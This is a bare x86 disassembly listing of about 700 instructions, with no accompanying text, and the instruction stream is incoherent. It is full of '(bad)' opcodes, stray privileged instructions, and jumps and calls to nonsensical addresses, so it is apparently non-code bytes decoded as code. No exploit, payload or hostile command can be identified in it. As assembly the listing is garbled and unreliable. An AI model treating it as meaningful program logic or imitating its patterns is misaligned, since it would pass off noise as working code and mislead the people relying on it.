  432d46:	mov    ecx,DWORD PTR [esi+0xc]
  432d49:	add    dh,al
  432d4b:	cmp    ecx,ebx
  432d4d:	jne    0x432d17
  432d4f:	xor    ecx,DWORD PTR [ebp+0x66]
  432d52:	jmp    0xca2d58
  432d57:	add    DWORD PTR [ebp+0x0],eax
  432d5a:	mov    eax,ebx
  432d5c:	or     al,0x8b
  432d5e:	(bad)  
  432d5f:	mov    ecx,esi
  432d61:	mov    BYTE PTR [eax+eax*1+0x664c136],cl
  432d68:	mov    eax,edi
  432d6a:	or     BYTE PTR [edx],cl
  432d6c:	shl    cl,cl
  432d6e:	icebp  
  432d6f:	add    BYTE PTR [ebp+0x38],0x8b
  432d73:	or     BYTE PTR [edx+eax*2],cl
  432d76:	(bad)  
  432d77:	or     cl,dh
  432d79:	stc    
  432d7a:	shl    DWORD PTR [ebp-0x30],0xc6
  432d7e:	xor    al,0x0
  432d80:	inc    ebp
  432d81:	xchg   BYTE PTR [ebx],al
  432d83:	add    esp,edi
  432d85:	add    BYTE PTR [ebp-0x39],cl
  432d88:	mov    al,bl
  432d8a:	test   DWORD PTR [ebx+0x1c348375],ecx
  432d90:	sub    al,0xbf
  432d92:	jmp    0x432d19
  432d94:	mov    edi,eax
  432d96:	lock jge 0x432d8a
  432d99:	lea    esi,[edx-0x74bad5ff]
  432d9f:	mov    ebp,esp
  432da1:	or     cl,dh
  432da3:	leave  
  432da4:	add    al,BYTE PTR [eax+eax*4-0x37ff9b00]
  432dab:	dec    ebp
  432dac:	dec    ebp
  432dad:	test   DWORD PTR [ebx],eax
  432daf:	paddb  mm6,mm0
  432db2:	add    DWORD PTR [eax],eax
  432db4:	dec    ebp
  432db5:	mov    ecx,DWORD PTR [ebx-0x64b217f0]
  432dbb:	mov    esi,DWORD PTR [edx]
  432dbd:	or     al,0x2b
  432dbf:	dec    ebp
  432dc0:	xor    ecx,DWORD PTR [ebx+0x4575083b]
  432dc6:	mov    esp,edi
  432dc8:	adc    BYTE PTR [ebp+edx*2+0x33ec3389],bl
  432dcf:	mov    DWORD PTR [ebx],ebp
  432dd1:	call   0xc76b701
  432dd6:	mov    DWORD PTR [ebp+0x10],ecx
  432dd9:	(bad)  
  432dda:	push   0x8b85ff10
  432ddf:	clc    
  432de0:	or     al,0x54
  432de2:	(bad)  
  432de3:	push   ecx
  432de4:	retf   
  432de5:	mov    ebx,0xff4d8dc8
  432dea:	mov    DWORD PTR [ebp+0x8],eax
  432ded:	xor    eax,DWORD PTR [ebp-0x75]
  432df0:	cmp    ebp,DWORD PTR [ebx]
  432df2:	lsl    ebx,WORD PTR [edi-0x8]
  432df6:	call   DWORD PTR [ebx-0x741bff75]
  432dfc:	(bad)  
  432dfd:	or     al,0x5b
  432dff:	dec    ebp
  432e00:	or     BYTE PTR [ebx],dh
  432e02:	inc    ebp
  432e03:	xor    esi,DWORD PTR ds:0x708088d
  432e09:	in     eax,0x9b
  432e0b:	add    BYTE PTR [edx],dh
  432e0d:	inc    ebp
  432e0e:	pop    edi
  432e0f:	xor    eax,edx
  432e11:	test   DWORD PTR [eax],0x81108b8b
  432e17:	dec    ebp
  432e18:	sub    al,0x33
  432e1a:	add    BYTE PTR [ebx],dh
  432e1c:	push   esi
  432e1d:	sub    ecx,DWORD PTR [ebx-0x768accc5]
  432e23:	mov    edi,eax
  432e25:	or     BYTE PTR [ebp+0x45],al
  432e28:	mov    DWORD PTR [ebx+0x45f4ec],ecx
  432e2e:	xor    ecx,ecx
  432e30:	pushf  
  432e31:	push   es
  432e32:	mov    DWORD PTR [esi-0x4],0xf8178538
  432e39:	dec    ebp
  432e3a:	inc    ebp
  432e3b:	cmp    BYTE PTR [ecx],0x54
  432e3e:	pushf  
  432e3f:	gs (bad) 
  432e41:	shl    esp,1
  432e43:	dec    ebp
  432e44:	xchg   BYTE PTR [eax-0x3dbaab08],al
  432e4a:	shr    ecx,1
  432e4c:	xlat   BYTE PTR ds:[ebx]
  432e4d:	rol    bh,cl
  432e4f:	mov    edx,esp
  432e51:	or     BYTE PTR [ebp+0x4588f84d],al
  432e57:	mov    ecx,DWORD PTR [eax]
  432e59:	or     BYTE PTR [eax],al
  432e5b:	push   ebp
  432e5c:	mov    edi,DWORD PTR [eax+0xfc728b]
  432e62:	dec    ebp
  432e63:	enter  0xceba,0x8
  432e67:	retf   0x1807
  432e6a:	ret    0x9b4d
  432e6d:	mov    esi,DWORD PTR [edx]
  432e6f:	or     al,0x33
  432e71:	into   
  432e72:	add    edx,esi
  432e74:	add    ecx,edx
  432e76:	bswap  eax
  432e78:	ror    esi,0x98
  432e7b:	dec    ebp
  432e7c:	add    cl,ch
  432e7e:	mov    edi,edi
  432e80:	hlt    
  432e81:	inc    esi
  432e83:	inc    ebp
  432e84:	ret    0x4533
  432e87:	mov    ecx,DWORD PTR [ebx+0x4d03fc2b]
  432e8d:	or     BYTE PTR [ebx],dh
  432e8f:	dec    ebp
  432e90:	xor    ecx,DWORD PTR [ebx-0x38fceffd]
  432e96:	jne    0xff8d2e5d
  432e9c:	inc    ebp
  432e9d:	inc    ebp
  432e9e:	mov    esi,DWORD PTR [ebx]
  432ea0:	clc    
  432ea1:	pop    esi
  432ea2:	ret    0xcaeb
  432ea5:	mov    eax,esi
  432ea7:	call   0x5204837a
  432eac:	dec    ebp
  432ead:	add    eax,0xf8728b
  432eb2:	adc    eax,0xce0ccac9
  432eb7:	push   ebp
  432eb8:	ret    0xc6ec
  432ebb:	in     al,dx
  432ebc:	call   0x33437bc5
  432ec1:	push   edi
  432ec2:	add    edi,eax
  432ec4:	xor    eax,eax
  432ec6:	jmp    0x432f0d
  432ec8:	xor    ecx,DWORD PTR [ecx+0x4503f433]
  432ece:	add    eax,edi
  432ed0:	shr    eax,cl
  432ed2:	mov    DWORD PTR [ebp+0x4545f8f8],eax
  432ed8:	mov    esi,DWORD PTR [edx]
  432eda:	in     al,dx
  432edb:	pushf  
  432edc:	ret    0x84c7
  432edf:	fcomp  DWORD PTR [ebx-0x7607cd7b]
  432ee5:	inc    ebp
  432ee6:	in     al,dx
  432ee7:	xor    DWORD PTR [ebp-0x64],eax
  432eea:	mov    eax,edi
  432eec:	cld    
  432eed:	fmul   st(2),st
  432eef:	sbb    dl,al
  432ef1:	jmp    0x9c3b:0x304d45c1
  432ef8:	jbe    0x432ec1
  432efa:	mov    esp,eax
  432efc:	clc    
  432efd:	add    BYTE PTR [ebp+0x0],cl
  432f00:	mov    ecx,ecx
  432f02:	lea    eax,[ebp-0x5]
  432f05:	mov    edi,edi
  432f07:	call   0x51ce8351
  432f0c:	hlt    
  432f0d:	xor    eax,edx
  432f0f:	mov    esi,0x9b7284
  432f14:	xor    cl,dl
  432f16:	mov    esi,eax
  432f18:	hlt    
  432f19:	into   
  432f1a:	inc    ebp
  432f1b:	scas   eax,DWORD PTR es:[edi]
  432f1c:	mov    ebp,ecx
  432f1e:	cld    
  432f1f:	add    dl,cl
  432f21:	add    dl,al
  432f23:	inc    ebp
  432f24:	shr    DWORD PTR [ebx],0x4d
  432f27:	xor    edi,DWORD PTR [ebx]
  432f29:	mov    DWORD PTR [edi],ecx
  432f2b:	clc    
  432f2c:	dec    esi
  432f2d:	inc    ebp
  432f2e:	dec    DWORD PTR [ebx-0x3d2b1775]
  432f34:	ret    0xc6ca
  432f37:	mov    BYTE PTR [ebp-0x32],0x53
  432f3b:	scas   eax,DWORD PTR es:[edi]
  432f3c:	inc    ebp
  432f3d:	jmp    0x432f6f
  432f3f:	mov    ebx,DWORD PTR [esp+edi*8+0x335b4d8b]
  432f46:	pop    ebx
  432f47:	xor    ecx,DWORD PTR [ebp+0x3]
  432f4a:	mov    eax,DWORD PTR [ebx]
  432f4c:	clc    
  432f4d:	test   edx,ecx
  432f4f:	mov    ecx,esi
  432f51:	cld    
  432f52:	call   0x8ab7749c
  432f57:	xor    ecx,DWORD PTR [eax+0x4533f303]
  432f5d:	add    ecx,DWORD PTR [ebx-0x4974072d]
  432f63:	fdiv   QWORD PTR [ebx]
  432f65:	retf   0xce89
  432f68:	in     al,0xc1
  432f6a:	inc    ebp
  432f6b:	or     cl,BYTE PTR [ebx-0x3d3d1b36]
  432f71:	into   
  432f72:	mov    dh,0xc1
  432f75:	call   0x8c1774fe
  432f7a:	(bad)  
  432f7b:	cld    
  432f7c:	mov    ecx,DWORD PTR [ebp-0x14]
  432f7f:	xor    eax,ecx
  432f81:	lea    eax,[ebp+0x8]
  432f84:	mov    esi,DWORD PTR [edx-0x4]
  432f87:	add    dl,al
  432f89:	inc    ebp
  432f8a:	mov    esp,0x32d89b8b
  432f8f:	dec    ebp
  432f90:	mov    esi,DWORD PTR [ebx]
  432f92:	cld    
  432f93:	xor    eax,edx
  432f95:	sub    esp,DWORD PTR [ebp-0x75]
  432f98:	int    0xec
  432f9a:	sub    ecx,eax
  432f9c:	add    esp,DWORD PTR [ecx-0x74b2ba20]
  432fa2:	mov    esi,esp
  432fa4:	call   0x34177d2d
  432fa9:	inc    DWORD PTR [ebx]
  432fab:	mov    edi,DWORD PTR [ebx]
  432fad:	cld    
  432fae:	jne    0x432ffd
  432fb0:	mov    esi,DWORD PTR [ebx]
  432fb2:	aam    0x8d
  432fb4:	dec    ebp
  432fb5:	or     BYTE PTR [ebx],dh
  432fb7:	jb     0x432fbc
  432fb9:	add    BYTE PTR [edi+0x45],bl
  432fbc:	ror    DWORD PTR [ebx+0x4d55e4c9],0xec
  432fc3:	xor    ebp,esp
  432fc5:	xor    eax,edi
  432fc7:	sub    edi,esp
  432fc9:	mov    eax,DWORD PTR [ebp+0x32c8f8f4]
  432fcf:	xchg   BYTE PTR [edi+edi*8+0x45e8ff89],bl
  432fd6:	inc    ebp
  432fd7:	xor    ecx,DWORD PTR [ecx+0x45891403]
  432fdd:	clc    
  432fde:	mov    eax,edi
  432fe0:	nop
  432fe1:	fadd   QWORD PTR [eax]
  432fe3:	xchg   BYTE PTR [ebx+0xdb14f8],cl
  432fe9:	jmp    0x432f74
  432feb:	mov    eax,DWORD PTR [ecx]
  432fed:	fadd   DWORD PTR [eax]
  432fef:	inc    ebp
  432ff0:	or     DWORD PTR [ebx],esi
  432ff2:	dec    eax
  432ff3:	add    edx,DWORD PTR [ebx-0x2d]
  432ff6:	dec    ebp
  432ff7:	mov    DWORD PTR [ebx+0x5707fcec],ecx
  432ffd:	inc    ebp
  432ffe:	push   esp
  432fff:	mov    dl,BYTE PTR [ecx-0xd]
  433002:	xor    ecx,DWORD PTR [ebp-0x45]
  433005:	(bad)  
  433007:	rol    BYTE PTR [eax],0xc1
  43300a:	ret    
  43300b:	inc    ebp
  43300c:	inc    ebp
  43300d:	mov    ecx,DWORD PTR [ebx-0x38b20324]
  433013:	xor    eax,ebx
  433015:	add    eax,DWORD PTR [ebp+0x23]
  433018:	mov    ecx,DWORD PTR [ebx-0x4bf7a08]
  43301e:	cmp    edi,0xc
  433021:	dec    ebp
  433022:	inc    ebp
  433023:	xor    ecx,DWORD PTR [ebx+0x40f8f889]
  433029:	inc    ebp
  43302a:	mov    esi,DWORD PTR [ebx]
  43302c:	clc    
  43302d:	lea    eax,[ebp+0x45725407]
  433033:	add    BYTE PTR [ebp+eax*2-0x75],dh
  433037:	xor    edi,DWORD PTR [eax]
  433039:	mov    ecx,0xff8b8d4d
  43303e:	push   esp
  43303f:	enter  0x4df7,0x23
  433043:	mov    DWORD PTR [ebx+0x4045f8e0],ecx
  433049:	mov    eax,DWORD PTR [ebx]
  43304b:	loopne 0x433038
  43304d:	ret    0xc68b
  433050:	push   esp
  433051:	enter  0x9745,0x8b
  433055:	inc    ebp
  433056:	cld    
  433057:	mov    eax,edi
  433059:	clc    
  43305a:	ret    
  43305b:	ret    0xc645
  43305e:	mov    esi,DWORD PTR [ebx]
  433060:	cld    
  433061:	pop    esi
  433062:	mov    ebx,0x83458bc3
  433068:	mov    ebp,DWORD PTR [esp+edi*8+0x45]
  43306c:	dec    ebp
  43306d:	xor    DWORD PTR [ebx],esi
  43306f:	pushf  
  433070:	add    edi,DWORD PTR [edx-0x7767a77]
  433076:	fcom   DWORD PTR [ebp+0x45]
  433079:	mov    esi,DWORD PTR [ebx]
  43307b:	adc    al,0x9c
  43307d:	inc    ebp
  43307e:	(bad)  
  43307f:	mov    ebx,eax
  433081:	adc    al,0x85
  433083:	cmp    al,0x1
  433086:	inc    ebp
  433087:	add    BYTE PTR ds:0xe98b9c4d,bh
  43308d:	mov    eax,DWORD PTR [ebx]
  43308f:	nop
  433090:	add    BYTE PTR [eax],al
  433092:	inc    ebp
  433093:	mov    esi,DWORD PTR [ebx]
  433095:	add    eax,DWORD PTR [ebx]
  433097:	cmp    al,0x89
  433099:	mov    esp,esi
  43309b:	clc    
  43309c:	inc    ebp
  43309d:	inc    ebp
  43309e:	add    edx,DWORD PTR [esi+0xc]
  4330a1:	mov    edi,0x7ff0845
  4330a6:	in     al,dx
  4330a7:	(bad)  
  4330a8:	jne    0x433045
  4330aa:	mov    esi,DWORD PTR [edx]
  4330ac:	clc    
  4330ad:	add    ebp,DWORD PTR [esi]
  4330af:	mov    edi,edi
  4330b1:	in     al,dx
  4330b2:	mov    DWORD PTR [ebp-0x10],eax
  4330b5:	xor    eax,DWORD PTR [ebp+0x3]
  4330b8:	cmp    DWORD PTR [ecx+0x458bf49c],ecx
  4330be:	fmul   DWORD PTR [ebx-0x173caf39]
  4330c4:	lea    ecx,[ecx+0x45e8d4bc]
  4330ca:	clc    
  4330cb:	mov    edi,edi
  4330cd:	cmp    BYTE PTR [ebp+0x4d],al
  4330d0:	test   DWORD PTR [eax+0x74],ecx
  4330d3:	inc    ecx
  4330d4:	mov    ecx,DWORD PTR [ebx+0x18c7f8d8]
  4330da:	ret    
  4330db:	inc    eax
  4330dc:	dec    DWORD PTR [ebx+0x4945f8f0]
  4330e2:	push   eax
  4330e3:	dec    eax
  4330e4:	test   al,0xd0
  4330e6:	dec    eax
  4330e8:	mov    eax,DWORD PTR [ebp-0x14]
  4330eb:	mov    eax,DWORD PTR [ebp+0x38]
  4330ee:	mov    eax,ecx
  4330f0:	fadd   DWORD PTR [ebx]
  4330f2:	dec    ebp
  4330f3:	inc    eax
  4330f4:	sub    ecx,DWORD PTR [ecx+0x45d81489]
  4330fa:	inc    ebp
  4330fb:	xor    ecx,DWORD PTR [ebx+0x4089f003]
  433101:	fadd   QWORD PTR [ebx]
  433103:	inc    ebp
  433104:	or     al,0x33
  433106:	dec    ebp
  433107:	add    edi,DWORD PTR [ebx]
  433109:	mov    DWORD PTR [edx-0x28],esi
  43310c:	mov    eax,DWORD PTR [ebp-0x10]
  43310f:	mov    eax,DWORD PTR [eax+0x10]
  433112:	mov    eax,edi
  433114:	lock ret 
  433116:	inc    ecx
  433117:	add    DWORD PTR [ebx-0x3e3827ab],ecx
  43311d:	fsubr  st,st(5)
  43311f:	test   DWORD PTR [eax],eax
  433121:	clc    
  433122:	push   0x45
  433124:	(bad)  
  433125:	cmp    al,0xec
  433127:	pushf  
  433128:	inc    ebp
  433129:	(bad)  
  43312a:	push   eax
  43312b:	fsub   DWORD PTR [eax-0x7b]
  43312e:	(bad)  
  43312f:	clc    
  433130:	mov    eax,0xf8008584
  433135:	mov    eax,DWORD PTR [ebp-0x4]
  433138:	mov    edi,0x4585c3cc
  43313e:	clc    
  43313f:	mov    eax,DWORD PTR [ebp+0x14]
  433142:	xor    eax,DWORD PTR [ebp-0x64]
  433145:	mov    edi,eax
  433147:	in     al,dx
  433148:	les    esi,FWORD PTR [ebp-0x7b]
  43314b:	mov    edi,eax
  43314d:	or     al,0x4d
  43314f:	dec    ebp
  433150:	mov    eax,ebp
  433152:	in     al,0xf2
  433154:	dec    ebp
  433155:	dec    DWORD PTR [ecx+0x4dc7e045]
  43315b:	fmul   DWORD PTR [ecx+0x4df8f085]
  433161:	inc    ebp
  433162:	mov    DWORD PTR [ebx],esi
  433164:	fadd   QWORD PTR [ebx]
  433166:	dec    ebp
  433167:	push   eax
  433168:	xor    eax,DWORD PTR [ebp+0x3]
  43316b:	push   eax
  43316c:	mov    DWORD PTR [eax+ebx*8],ebx
  43316f:	push   esi
  433171:	mov    eax,DWORD PTR [eax]
  433173:	lock cmp eax,0xf84e85c0
  433179:	inc    ebp
  43317a:	test   BYTE PTR [ebx],dh
  43317c:	add    DWORD PTR [ebx],eax
  43317e:	add    BYTE PTR [eax+0x4d],dl
  433181:	jne    0x4331b6
  433183:	lea    ecx,[ebx-0x7617fc44]
  433189:	div    ah
  43318b:	inc    DWORD PTR [ebp+0x45]
  43318e:	xor    ecx,DWORD PTR [ecx+0x4530d88d]
  433194:	jb     0x433121
  433196:	add    BYTE PTR [eax*2-0x17ba743f],cl
  43319d:	mov    ecx,DWORD PTR [ebp-0x10]
  4331a0:	xor    ecx,DWORD PTR [ebp+0x3]
  4331a3:	mov    edi,DWORD PTR [ebx]
  4331a5:	adc    BYTE PTR [ebp+0x41],dh
  4331a8:	mov    ecx,DWORD PTR [ebx-0x37382704]
  4331ae:	ret    
  4331af:	push   ss
  4331b0:	push   0x45
  4331b2:	lea    ecx,[ebx+0x4de80cb0]
  4331b8:	sti    
  4331b9:	add    edi,edi
  4331bb:	or     BYTE PTR [ebp+0x4d],al
  4331be:	mov    ebp,DWORD PTR [ebx]
  4331c0:	xor    ebp,ecx
  4331c2:	mov    al,BYTE PTR [edx]
  4331c4:	add    eax,0xc7200
  4331c9:	jne    0x433218
  4331cb:	lea    esi,[ebx]
  4331cd:	mov    al,0xf
  4331cf:	call   0xf2894
  4331d4:	shl    DWORD PTR [ecx],0x84
  4331d7:	pushf  
  4331d8:	add    DWORD PTR [ecx+0x4545d000],ecx
  4331de:	mov    esi,DWORD PTR [edx]
  4331e0:	xor    ebx,DWORD PTR [edx+ecx*4+0x72c805c7]
  4331e7:	test   DWORD PTR [eax],eax
  4331e9:	clc    
  4331ea:	dec    ebp
  4331eb:	inc    ebp
  4331ec:	xor    edi,DWORD PTR [edi+ecx*1]
  4331ef:	pushf  
  4331f0:	ror    BYTE PTR [ebp+0x4dc1d0cb],0x84
  4331f7:	lea    eax,[ecx]
  4331f9:	int3   
  4331fa:	add    BYTE PTR [ebp+0x45],cl
  4331fd:	lea    ecx,[ebx-0x75b2cc38]
  433203:	lea    eax,ds:0x4d72c4
  433209:	mov    ecx,DWORD PTR [ebp-0x4]
  43320c:	xor    ecx,edi
  43320e:	bswap  ebx
  433210:	ror    BYTE PTR [ebp-0x35],0xe9
  433214:	rol    DWORD PTR [ecx],0x84
  433217:	add    BYTE PTR [ecx],al
  433219:	xor    eax,DWORD PTR [eax]
  43321b:	pushf  
  43321c:	inc    ebp
  43321d:	jnp    0x8a436620
  433223:	mov    eax,DWORD PTR ds:0xcf72e8
  433229:	lock dec ebp
  43322b:	retf   
  43322c:	xor    ecx,DWORD PTR [ebp+0xf]
  43322f:	mov    eax,eax
  433231:	fmul   st,st(3)
  433233:	test   ecx,0x19b8484
  433239:	xor    al,BYTE PTR [eax]
  43323b:	mov    DWORD PTR [ebp-0x28],eax
  43323e:	mov    eax,DWORD PTR [ebp+0x33]
  433241:	mov    ecx,DWORD PTR [edx+0x72c705d8]
  433247:	ret    
  433248:	add    al,cl
  43324a:	dec    ebp
  43324b:	adc    ecx,DWORD PTR [ebx-0x75ccccbb]
  433251:	add    ecx,DWORD PTR ds:0xc7250
  433257:	inc    ebp
  433258:	rcl    DWORD PTR [eax+0x4d],0x2b
  43325c:	mov    edi,edi
  43325e:	xor    ecx,DWORD PTR [ebx+0xde48a]
  433264:	jb     0x43322d
  433266:	add    BYTE PTR [ecx+eax*8-0x74cdb2b5],al
  43326d:	mov    esi,DWORD PTR [ebx]
  43326f:	cld    
  433270:	mov    cl,bh
  433272:	or     eax,0x372b6
  433277:	cmp    ecx,eax
  433279:	jne    0x4332f6
  43327f:	mov    eax,DWORD PTR [ebp-0x20]
  433282:	mov    eax,DWORD PTR [eax]
  433284:	xor    eax,edi
  433286:	mov    al,BYTE PTR [ebp+eax*1+0x32724b]
  43328d:	mov    ecx,DWORD PTR [ebp-0x4]
  433290:	mov    ecx,edi
  433292:	xor    esi,DWORD PTR [esi+0x3b0d038a]
  433298:	jb     0x4332a9
  43329a:	add    BYTE PTR [edi-0x3f],dl
  43329d:	add    BYTE PTR [ebp-0x75],cl
  4332a0:	mov    esi,eax
  4332a2:	xor    eax,DWORD PTR [eax]
  4332a4:	mov    al,bh
  4332a6:	or     eax,0x4b7284
  4332ab:	xor    al,cl
  4332ad:	mov    ecx,DWORD PTR [ebp-0x4]
  4332b0:	mov    ecx,edi
  4332b2:	xor    esi,DWORD PTR [esi+0x3b0d038a]
  4332b8:	jb     0x4332c9
  4332ba:	add    BYTE PTR [edi],dh
  4332bc:	enter  0x8500,0x8b
  4332c0:	add    ah,bl
  4332c2:	add    BYTE PTR [eax],al
  4332c4:	inc    ebp
  4332c5:	(bad)  
  4332c6:	mov    eax,DWORD PTR [ebx+esi*1+0x5328a4b]
  4332cd:	mov    esi,DWORD PTR [edx-0x4]
  4332d0:	add    bh,cl
  4332d2:	dec    ebp
  4332d3:	mov    dh,0x8b
  4332d5:	add    esi,DWORD PTR [ebx]
  4332d7:	cmp    ecx,DWORD PTR [edx+0x72170d0f]
  4332dd:	add    BYTE PTR [eax],al
  4332df:	mov    eax,ecx
  4332e1:	loopne 0x433330
  4332e3:	add    BYTE PTR [ebx-0x757bcc39],cl
  4332e9:	dec    ebx
  4332ea:	or     eax,0x8b7232
  4332ef:	in     al,0xc1
  4332f1:	or     DWORD PTR [ebp-0x31],ecx
  4332f4:	mov    ecx,DWORD PTR [ebx+esi*1+0xd328a4b]
  4332fb:	xor    dh,BYTE PTR [edx-0x75]
  4332fe:	add    al,dh
  433300:	enter  0x4f09,0xcf
  433304:	inc    ebp
  433305:	mov    WORD PTR [ebx-0x75cdccb5],cs
  43330b:	or     al,BYTE PTR ds:0xe4728b
  433311:	or     DWORD PTR [ebp-0x31],ecx
  433314:	mov    ecx,DWORD PTR [ebx+esi*1+0xd328a4f]
  43331b:	cmp    dh,BYTE PTR [edx+0xf]
  43331e:	add    bl,dl
  433320:	rol    DWORD PTR [eax],0x4d
  433323:	mov    ecx,DWORD PTR [ebx-0x75ffcc10]
  433329:	(bad)  
  43332a:	or     eax,0x4b7284
  43332f:	xor    al,cl
  433331:	mov    ecx,DWORD PTR [ebp-0x20]
  433334:	mov    ecx,DWORD PTR [ecx]
  433336:	xor    ecx,edi
  433338:	mov    cl,BYTE PTR [ebp+ecx*1+0x32724b]
  43333f:	xor    cl,al
  433341:	mov    ecx,DWORD PTR [edi]
  433343:	fadd   QWORD PTR [ebp+0x9]
  433346:	call   0xffd02e1a
  43334b:	dec    ebx
  43334c:	dec    ebp
  43334d:	xor    bh,BYTE PTR [ebx]
  43334f:	or     dh,BYTE PTR [ebx+ecx*4-0x75]
  433353:	loopne 0x433351
  433355:	or     edi,eax
  433357:	iret   
  433358:	ret    
  433359:	mov    WORD PTR [ebp+0x4f],es
  43335c:	mov    esi,DWORD PTR [edx]
  43335e:	call   0x8452fa9d
  433363:	(bad)  
  433364:	fwait
  433365:	add    BYTE PTR [edx],dh
  433367:	mov    esi,DWORD PTR [ebx]
  433369:	fmul   QWORD PTR [ebx+0x55c7fc00]
  43336f:	test   BYTE PTR [ebx],dh
  433371:	dec    ebx
  433372:	add    esi,DWORD PTR [edx]
  433374:	cmp    ecx,DWORD PTR [ebx+0x9f8f00f]
  43337a:	dec    edi
  43337c:	mov    ecx,DWORD PTR [esp+edi*8+0x33324d4b]
  433383:	xor    al,BYTE PTR [ebx]
  433385:	mov    edi,DWORD PTR [ebx]
  433387:	in     al,0x75
  433389:	or     DWORD PTR [ebx+0x4d8ce8cf],ecx
  43338f:	dec    ebx
  433390:	xor    esi,DWORD PTR [edx]
  433392:	lea    ecx,[edx]
  433394:	or     BYTE PTR [ebx+0x900f072],cl
  43339a:	ja     0x43336b
  43339c:	sbb    BYTE PTR [ebp+esi*2-0x67cd72b1],cl
  4333a3:	cmp    ch,al
  4333a5:	jne    0x43339a
  4333a7:	mov    edi,edi
  4333a9:	fadd   QWORD PTR [ebp+0x0]
  4333ac:	mov    eax,edi
  4333ae:	fadd   DWORD PTR [edi+eax*8-0x3ecd3cb5]
  4333b5:	mov    edx,DWORD PTR [ebx]
  4333b7:	in     al,0x45
  4333b9:	or     DWORD PTR [ebx],esi
  4333bb:	iret   
  4333bc:	add    ecx,DWORD PTR [eax+edx*2+0x4532184b]
  4333c3:	xor    dl,BYTE PTR [eax-0x75]
  4333c6:	sbb    al,0xe0
  4333c8:	dec    DWORD PTR [ecx]
  4333ca:	mov    ecx,edi
  4333cc:	in     al,dx
  4333cd:	mov    eax,es
  4333cf:	dec    ebx
  4333d0:	mov    DWORD PTR [edx],esi
  4333d2:	fmul   QWORD PTR [edx]
  4333d4:	jne    0x433361
  4333d6:	(bad)  
  4333d7:	(bad)  
  4333d9:	or     DWORD PTR [ebp-0x31],eax
  4333dc:	add    ecx,DWORD PTR [eax+ecx*1-0xccd17b1]
  4333e3:	cmp    bh,bh
  4333e5:	jne    0x43342c
  4333e7:	lea    ecx,[ebx-0x38372750]
  4333ed:	inc    ebx
  4333ef:	mov    eax,ecx
  4333f1:	mov    eax,0xa00c111
  4333f6:	jne    0x43343d
  4333f8:	mov    esi,DWORD PTR [ebx]
  4333fa:	test   al,0x3
  4333fc:	inc    ebp
  4333fd:	mov    DWORD PTR [eax-0xc],edx
  433400:	loop   0x433447
  433402:	push   DWORD PTR [ebx]
  433404:	mov    ecx,DWORD PTR [ebp+0x724d3010]
  43340a:	add    DWORD PTR [eax],eax
  43340c:	mov    eax,edi
  43340e:	lods   al,BYTE PTR ds:[esi]
  43340f:	dec    ebp
  433410:	inc    ebp
  433411:	mov    ecx,DWORD PTR [ecx+0x45cf14f4]
  433417:	retf   
  433418:	mov    edx,ecx
  43341a:	adc    al,0x84
  43341c:	(bad)  
  43341d:	std    
  43341e:	ret    
  43341f:	jmp    FWORD PTR [edi-0x2b7474bb]
  433425:	hlt    
  433426:	rol    edi,0x82
  433429:	ret    
  43342a:	cld    
  43342b:	enter  0x11ff,0x45
  43342f:	inc    ebp
  433430:	pop    edi
  433431:	mov    ebx,DWORD PTR [ebx+0x14]
  433434:	ret    0xc7
  433437:	test   BYTE PTR [ebx+0x4532519b],cl
  43343d:	jmp    0x4333ca
  43343f:	push   0x8
  433441:	call   DWORD PTR [esi]
  433443:	in     al,dx
  433444:	add    BYTE PTR [ebp+0x1],0x50
  433448:	add    bh,ah
  43344a:	add    bh,bh
  43344c:	icebp  
  43344d:	mov    ecx,DWORD PTR [eax]
  43344f:	cld    
  433450:	pop    es
  433451:	dec    ebp
  433452:	shl    DWORD PTR [ebx],0x72
  433455:	add    eax,DWORD PTR [eax]
  433457:	cmp    edx,ecx
  433459:	je     0x43346b
  43345b:	mov    esi,DWORD PTR [ebp-0x4]
  43345e:	inc    edi
  433460:	or     al,0xc3
  433462:	jmp    FWORD PTR [edx-0x18]
  433465:	(bad)  
  433466:	sti    
  433467:	cwde   
  433468:	(bad)  
  433469:	call   0xffa12d74
  43346e:	or     al,0x45
  433470:	push   ebp
  433471:	sub    esp,0x18
  433474:	push   ebx
  433475:	inc    ebp
  433476:	mov    edi,edi
  433478:	mov    ebp,DWORD PTR [eax+ecx*1+0x578b4d75]
  43347f:	test   al,0x54
  433481:	inc    ebp
  433482:	push   ecx
  433483:	push   eax
  433484:	xor    ebp,DWORD PTR [ebx-0x748d0041]
  43348a:	add    ah,bh
  43348c:	(bad)  
  43348d:	dec    ebp
  43348e:	add    DWORD PTR [ebx],esi
  433490:	inc    ebp
  433491:	add    ecx,DWORD PTR [ebx+0x74943b]
  433497:	push   0xffffff8b
  433499:	dec    DWORD PTR [ebx-0x7fbaeb54]
  43349f:	add    eax,DWORD PTR [ecx]
  4334a1:	or     BYTE PTR [eax],al
  4334a3:	call   0xff852ca8
  4334a8:	mov    eax,DWORD PTR [ebp+0x14]
  4334ab:	mov    ecx,DWORD PTR [ecx+0x801ac]
  4334b1:	inc    ebp
  4334b2:	dec    ecx
  4334b3:	add    ebp,DWORD PTR [edx+0x14]
  4334b6:	push   0x8b3045
  4334bb:	call   0x33ad8230
  4334c0:	inc    DWORD PTR [ebx]
  4334c2:	mov    DWORD PTR [edi],ecx
  4334c4:	mov    eax,ecx
  4334c6:	or     BYTE PTR [ebp-0x3d],cl
  4334c9:	cmp    eax,edi
  4334cb:	cmovne esp,DWORD PTR [ebx+ecx*4-0x1]
  4334d0:	adc    BYTE PTR [ebx+0x5eff0845],cl
  4334d6:	adc    al,0xc9
  4334d8:	inc    ebp
  4334d9:	adc    BYTE PTR [eax+0x55],dl
  4334dc:	jne    0x4334ca
  4334de:	call   0xff54346e
  4334e3:	dec    ebp
  4334e4:	inc    ebp
  4334e5:	mov    ecx,DWORD PTR [ebx+0x390338b]
  4334eb:	add    BYTE PTR [ebx],bh
  4334ed:	mov    esi,DWORD PTR [ecx+eax*4-0x75]
  4334f1:	push   esp
  4334f2:	or     al,0x51
  4334f4:	dec    ebp
  4334f5:	xor    DWORD PTR [ebx],0xf32039b
  4334fb:	cmp    eax,DWORD PTR [ebp+0x74]
  4334fe:	mov    edi,edi
  433500:	pop    edi
  433501:	adc    BYTE PTR [ebx+0x75],bl
  433504:	ret    0x50
  433507:	mov    edx,DWORD PTR ss:[edi-0x7d]
  43350b:	(bad)  
  43350c:	clc    
  43350d:	mov    esp,ebp
  43350f:	pop    ecx
  433510:	mov    ecx,0xf80085c2
  433515:	mov    ecx,DWORD PTR [ecx+edx*2]
  433518:	push   esi
  433519:	push   esi
  43351a:	(bad)  
  43351b:	lock add DWORD PTR [ebp+0x44],eax
